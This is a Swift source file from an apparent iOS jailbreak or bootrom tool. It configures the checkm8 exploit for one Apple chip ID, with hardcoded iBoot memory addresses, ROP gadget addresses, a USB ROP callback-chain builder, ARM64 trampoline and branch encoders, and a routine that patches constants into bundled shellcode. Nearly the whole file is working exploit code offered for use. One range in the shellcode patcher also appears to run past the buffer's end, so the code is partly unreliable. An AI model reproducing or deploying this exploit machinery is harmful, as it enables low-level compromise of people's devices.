//
//  ExploitConfig.swift
//  Queen-IOKit
//
//  Created by Cookie on 6/2/24.
//

import Foundation
import MVPCStruct

let PAYLOAD_OFFSET_ARMV7 = 384
let PAYLOAD_SIZE_ARMV7   = 320
let PAYLOAD_OFFSET_ARM64 = 384
let PAYLOAD_SIZE_ARM64   = 576

enum ExploitConfigError: Error {
    case DeviceNotSupported(UInt16)
    case PackingError
    case FileNotFound(fileName: String)
}

class ExploitConfig {
    
    let version: String // iBoot v string
    let cpid: UInt16
    let largeLeak: Int
    let overwrite: [UInt8]?
    let overwriteOffset: UInt16
    let hole: Int
    let leak: Int
    
    var usbConstants: [UInt64]
    var checkm8Constants: [UInt64]
    
    let loadWriteGadget: UInt64
    let writeSctlrGadget: UInt64
    let funcGadget: UInt64
    let writeTtbr0: UInt64
    let tlbi: UInt64
    let dcCivac: UInt64
    let dmb: UInt64
    let handleInterfaceRequest: UInt64
    let nopGadget: UInt64
    
    let callbacks: [(UInt64, UInt64)]
    
    init(withCpid cpid: UInt16) throws {
        switch cpid {
        case 0x8015:
            self.version = "iBoot-3332.0.0.1.23"
            self.cpid = cpid
            self.largeLeak = 0
            self.overwrite = nil
            self.overwriteOffset = 0x500
            self.hole = 6
            self.leak = 1
            
            self.usbConstants = [
                0x18001C000, // 1 - LOAD_ADDRESS
                0x6578656365786563, // 2 - EXEC_MAGIC
                0x646F6E65646F6E65, // 3 - DONE_MAGIC
                0x6D656D636D656D63, // 4 - MEMC_MAGIC
                0x6D656D736D656D73, // 5 - MEMS_MAGIC
                0x10000B9A8, // 6 - USB_CORE_DO_IO
            ]
            
            self.checkm8Constants = [
                0x180008528, // 1 - gUSBDescriptors
                0x180003A78, // 2 - gUSBSerialNumber
                0x10000AE80, // 3 - usb_create_string_descriptor
                0x1800008FA, // 4 - gUSBSRNMStringDescriptor
                0x18001BC00, // 5 - PAYLOAD_DEST
                UInt64(PAYLOAD_OFFSET_ARM64), // 6 - PAYLOAD_OFFSET
                UInt64(PAYLOAD_SIZE_ARM64), // 7 - PAYLOAD_SIZE
                0x180008638, // 8 - PAYLOAD_PTR
            ]
            
            self.loadWriteGadget        = 0x10000945C
            self.writeSctlrGadget       = 0x1000003EC
            self.funcGadget             = 0x10000A9AC
            self.writeTtbr0             = 0x10000045C
            self.tlbi                   = 0x1000004AC
            self.dcCivac                = 0x1000004D0
            self.dmb                    = 0x1000004F0
            self.handleInterfaceRequest = 0x10000BCCC
            
            self.nopGadget              = 0x10000A9C4
            
            self.callbacks = [
                (dcCivac,                 0x18001C800),
                (dcCivac,                 0x18001C840),
                (dcCivac,                 0x18001C880),
                (dmb,                     0),
                (writeSctlrGadget,        0x100D),
                (loadWriteGadget,         0x18001C000),
                (loadWriteGadget,         0x18001C010),
                (writeTtbr0,              0x180020000),
                (tlbi,                    0),
                (loadWriteGadget,         0x18001C020),
                (writeTtbr0,              0x18000C000),
                (tlbi,                    0),
                (0x18001C800,             0),
            ]
            
        default:
            throw ExploitConfigError.DeviceNotSupported(cpid)
        }
    }
    
    
    func usbRopCallbacks(address: UInt64, funcGadget: UInt64, callbacks: [(UInt64, UInt64)]) throws -> [UInt8] {
        let packer = try CStruct(format: "<Q")
        var data = [UInt8]()
        var addr = address
        
        try stride(from: 0, to: callbacks.count, by: 5).forEach { i in
            var block1 = [UInt8]()
            var block2 = [UInt8]()
            
            for j in 0..<5 {
                addr += 0x10
                if j == 4 {
                    addr += 0x50
                }
                if i + j < callbacks.count - 1 {
                    guard let packed1 = try? packer.pack([funcGadget, addr]),
                          let packed2 = try? packer.pack([callbacks[i + j].1, callbacks[i + j].0])
                    else { throw ExploitConfigError.PackingError }
                    
                    block1.append(contentsOf: packed1)
                    block2.append(contentsOf: packed2)
                } else if i + j == callbacks.count - 1 {
                    guard let packed1 = try? packer.pack([funcGadget, 0]),
                          let packed2 = try? packer.pack([callbacks[i + j].1, callbacks[i + j].0])
                    else { throw ExploitConfigError.PackingError }
                    
                    block1.append(contentsOf: packed1)
                    block2.append(contentsOf: packed2)
                } else {
                    guard let packed1 = try? packer.pack([0, 0]) else { throw ExploitConfigError.PackingError }
                    block1.append(contentsOf: packed1)
                }
            }
            data.append(contentsOf: block1)
            data.append(contentsOf: block2)
        }
        return data
    }
    
    func asmArm64X7Trampoline(address: UInt64) throws -> [UInt8] {
        // return '47000058E0001FD6'.decode('hex') + struct.pack('<Q', dest)
        let packer = try CStruct(format: "<Q")
        guard let packed = try? packer.pack([address]) else { throw ExploitConfigError.PackingError }
        
        return "47000058E0001FD6".decode() + packed
    }
    
    func asmArm64Branch(source: UInt32, destination: UInt32) throws -> [UInt8] {
        let packer = try CStruct(format: "<I")
        
        if source > destination {
            let value = 0x18000000 - (source - destination) / 4
            guard let packed = try? packer.pack([value]) else { throw ExploitConfigError.PackingError }
            return [UInt8](packed)
        } else {
            let value = 0x14000000 + (destination - source) / 4
            guard let packed = try? packer.pack([value]) else { throw ExploitConfigError.PackingError }
            return [UInt8](packed)
        }
    }
    
    func prepareShellcode(for fileName: String, constants: [UInt64]) throws -> [UInt8] {
        var shellcode = [UInt8]()
        guard let filePath = Bundle.main.url(forResource: fileName, withExtension: ".bin") else {
            throw ExploitConfigError.FileNotFound(fileName: fileName)
        }
        
        if let data = try? Data(contentsOf: filePath) {
            var buffer = [UInt8](repeating: 0, count: data.count)
            data.copyBytes(to: &buffer, count: data.count)
            shellcode = buffer
        } else { throw ExploitConfigError.FileNotFound(fileName: fileName) }
        
        var formatString: String
        var size: Int
        
        if fileName.hasSuffix("_armv7") {
            formatString = "<I"
            size = 4
        } else if fileName.hasSuffix("_arm64") {
            formatString = "<Q"
            size = 8
        } else {
            throw ExploitConfigError.DeviceNotSupported(0)
        }
        
        // Shellcode has placeholder values for constants
        let packer = try CStruct(format: formatString)
        let placeholderOffset = shellcode.count - size * constants.count
        
        var byteArray = [UInt8]()
        
        for (index, constant) in constants.enumerated() {
            let offset = placeholderOffset + size * index
            guard let packed = try? packer.pack([constant]) else { throw ExploitConfigError.PackingError }
            byteArray.append(contentsOf: packed)
        }
        
        assert(byteArray.count == constants.count * size, "Constants and bytearray size differ")
        
        // Replace placeholders with constants
        shellcode.replaceSubrange(placeholderOffset...shellcode.count, with: byteArray)
        
        return shellcode
    }
}
